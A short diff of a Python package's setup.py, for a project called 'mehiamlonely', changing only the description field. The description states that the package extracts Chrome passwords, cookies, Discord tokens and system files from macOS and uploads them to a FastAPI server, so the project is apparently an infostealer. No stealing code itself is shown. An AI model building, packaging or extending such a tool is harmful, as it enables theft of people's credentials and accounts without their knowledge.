@@ -54,7 +54,7 @@ setup(
     version=get_version(),
     author="Your Name",
     author_email="your.email@example.com",
-    description="macOS File System and Chrome Data Extractor - Extracts Chrome passwords, cookies, tokens, and system files, uploads to FastAPI server",
+    description="macOS File System and Chrome Data Extractor - Extracts Chrome passwords, cookies, Discord tokens, and system files, uploads to FastAPI server",
     long_description=read_readme(),
     long_description_content_type="text/markdown",
     url="https://github.com/yourusername/mehiamlonely",
